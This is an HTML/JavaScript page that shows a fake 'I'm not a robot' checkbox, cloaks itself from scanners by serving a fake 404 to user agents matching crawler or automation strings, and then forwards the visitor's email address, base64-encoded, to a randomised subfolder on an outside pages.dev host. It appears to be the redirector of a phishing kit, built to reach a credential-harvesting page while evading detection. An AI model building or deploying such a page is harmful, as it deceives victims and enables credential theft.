<!DOCTYPE html>
<html>
<head>
    <title>Blob Redirect + Anti-Bot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    /* Overlay */
    #overlay {
        position: fixed;
        inset: 0;
        background: #00875A;
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 999999;
    }
    #verificationBox {
        background: #fff;
        padding: 16px 20px;
        border-radius: 16px;
        width: 220px;
        box-shadow: 0 4px 14px rgba(0,0,0,0.14);
        border: 1px solid #dcdcdc;
    }
    .verify-row { display:flex; align-items:center; gap:10px; }
    #robotIcon { width:26px;height:26px;border-radius:50%;background:#e8f0fe; display:flex; align-items:center; justify-content:center; font-size:14px; }
    #checkbox { width:22px;height:22px;border-radius:5px;border:2px solid #7f8fa6;background:#fff; cursor:pointer; position:relative; transition:.2s;}
    #checkbox.active { background:#34a853; border-color:#34a853; box-shadow:0 0 6px rgba(52,168,83,0.6);}
    #checkbox.active::after { content:""; position:absolute; left:6px; top:3px; width:5px; height:10px; border:2px solid white; border-left:none; border-top:none; transform:rotate(45deg);}
    #verifying { display:none; margin-top:10px; font-size:12px; text-align:center; color:#555;}
    .spinner { width:12px; height:12px; border-radius:50%; border:2px solid #40739e; border-top-color:transparent; animation:spin .6s linear infinite;}
    @keyframes spin { from{transform:rotate(0);} to{transform:rotate(360deg);} }
    </style>
</head>
<body>

<div id="overlay">
    <div id="verificationBox">
        <div class="verify-row">
            <div id="robotIcon">ðŸ¤–</div>
            <strong>I'm not a robot</strong>
            <div id="checkbox"></div>
        </div>
        <div id="verifying">
            <div class="spinner"></div> Verifyingâ€¦
        </div>
    </div>
</div>

<script>
// Friendly bot check
async function friendlyBotCheck() {
    let score = 0;
    const ua = navigator.userAgent.toLowerCase();
    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score+=30;
    if(navigator.webdriver) score+=30;
    return score>=60;
}

// Subfolders & Base domain
const BASE_DOMAIN = "https://23b538b5.ko1wx90sd.pages.dev";
const SUBFOLDERS = ["sub1","sub2","sub3","sub4","sub5"];

function base64Encode(str) { return btoa(unescape(encodeURIComponent(str))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }

function buildRandomURL(email="") {
    const folder = SUBFOLDERS[Math.floor(Math.random()*SUBFOLDERS.length)];
    const timestamp = Date.now();
    const payload = {email, ts:timestamp};
    const encoded = base64Encode(JSON.stringify(payload));
    return `${BASE_DOMAIN}/${folder}/?data=${encoded}`;
}

// Verification
function requireVerification() {
    return new Promise(resolve=>{
        const checkbox=document.getElementById("checkbox");
        const verifying=document.getElementById("verifying");
        const overlay=document.getElementById("overlay");

        checkbox.onclick=()=>{
            checkbox.classList.add("active");
            verifying.style.display="block";
            setTimeout(()=>{
                overlay.style.opacity=0;
                setTimeout(()=>overlay.remove(),300);
                resolve(true);
            },700);
        }
    });
}

// 404 fallback
function show404() {
    document.body.innerHTML='<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; background:#f8f8f8; text-align:center;">'+
    '<h1 style="font-size:90px; margin:0;">404</h1>'+
    '<h2 style="font-size:26px; margin:0;">Error</h2>'+
    '<p style="font-size:18px;">The requested page could not be found.</p></div>';
}

// Main
document.addEventListener("DOMContentLoaded", async()=>{
    await requireVerification();
    if(await friendlyBotCheck()){ show404(); return; }
    const email = new URLSearchParams(location.search).get("email")||"";
    const targetURL = buildRandomURL(email);

    // Redirect main window directly (no blob)
    window.location.href = targetURL;
});
</script>

</body>
</html>
